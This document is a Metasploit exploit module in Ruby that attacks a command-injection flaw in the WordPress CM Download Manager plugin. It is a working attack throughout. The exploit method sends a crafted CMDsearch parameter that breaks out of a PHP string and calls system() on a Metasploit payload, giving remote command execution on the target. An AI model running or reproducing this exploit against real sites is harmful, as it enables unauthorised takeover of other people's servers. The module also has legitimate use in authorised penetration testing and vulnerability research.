# This module requires Metasploit: http//metasploit.com/download
##
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Wordpress CM Download Manager Remote Code Execution',
      'Description' => %q{
      This module exploits a remote code execution vulnerability in order
      to execute operating system commands on the host target.
      },
      'Author' =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #metasploit module
        ],
      'License' => 'ExploitHub',
      'References' =>
        [
          ['URL', 'http://1337day.com/exploit/22907']
        ],
      'Privileged' => false,
      'Platform'   => ['unix'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%'",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 20 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Wordpress path", '/']),
      ], self.class)
  end

  def exploit
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cmdownloads/'),
      'vars_get' => {
        'CMDsearch' => '".system(\''+payload.encoded+'\')."'
      }
    })
  end
end
